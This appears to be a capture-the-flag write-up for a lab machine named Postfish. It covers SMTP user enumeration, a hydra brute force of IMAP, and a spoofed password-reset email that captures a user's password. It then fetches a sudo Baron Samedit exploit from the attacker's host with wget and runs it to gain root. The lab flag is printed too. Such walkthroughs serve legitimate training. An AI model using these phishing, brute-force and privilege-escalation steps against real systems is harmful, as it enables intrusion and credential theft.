# Postfish

## Enumeration

An initial scan reveals SSH, SMTP, HTTP, POP3, and IMAP services.

```bash
rustscan -a 192.168.172.137 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu
25/tcp  open  smtp     Postfix smtpd
80/tcp  open  http     Apache
110/tcp open  pop3     Dovecot pop3d
143/tcp open  imap     Dovecot imapd
993/tcp open  ssl/imap Dovecot imapd
995/tcp open  ssl/pop3 Dovecot pop3d
```

SMTP supports `VRFY`, so it can be used to enumerate valid users:

```bash
sudo perl smtp-user-enum.pl -M VRFY \
-U /home/kali/SecLists/Usernames/Names/names.txt \
-t 192.168.172.137
```

This identifies several valid accounts, including `sales`.

The website reveals the hostname `postfish.off`, so it is added to `/etc/hosts`:

```text
192.168.172.137 postfish.off
```

The `/team.html` page also exposes four employee names:

```text
claire.madison
mike.ross
brian.moore
sarah.lorem
```

Enumerating these names through SMTP confirms that all four accounts exist.

## Mail Access

Using the discovered usernames as both login names and passwords finds a valid IMAP credential:

```bash
hydra -L team.txt -P team.txt imap://192.168.172.137:143
```

```text
[143][imap] host: 192.168.172.137
login: sales
password: sales
```

Logging into POP3 with `sales:sales` reveals an email from IT:

```text
Subject: ERP Registration Reminder

Hi Sales team,

We will be sending out password reset links in the upcoming week
so that we can get you registered on the ERP system.

Regards,
IT
```

This suggests that the password-reset process can be abused.

## Password Reset

We send a crafted email to `brian.moore@postfish.off`, pointing the reset link to our listener:

```text
MAIL FROM: it@postfish.off
RCPT TO: brian.moore@postfish.off
DATA
Subject: Password reset process

Hi Brian,

Please follow this link to reset your password:
http://192.168.45.245/

Regards,
.
```

The victim application follows the supplied link and sends the reset information back to our listener. The response contains Brian's password:

```text
password=EternaLSunshinE
```

## Initial Access

The recovered credentials work over SSH:

```bash
ssh brian.moore@192.168.172.137
```

```text
brian.moore@postfish's password: EternaLSunshinE
```

The local flag is located in Brian's home directory:

```bash
brian.moore@postfish:~$ cat local.txt
2de79ba23bb360f2604861b9560eab64
```

## Privilege Escalation

Running LinPEAS identifies the host as vulnerable to **CVE-2021-3156 (Baron Samedit)**:

```text
[+] [CVE-2021-3156] sudo Baron Samedit
    Exposure: probable

[+] [CVE-2021-3156] sudo Baron Samedit 2
    Exposure: probable
```

The vulnerability affects vulnerable versions of `sudo` and can be used for local privilege escalation.

Using the referenced exploit:

```bash
wget 192.168.45.245/exploit_nss.py
python3 exploit_nss.py
```

The exploit returns a root shell:

```text
# whoami
root
```
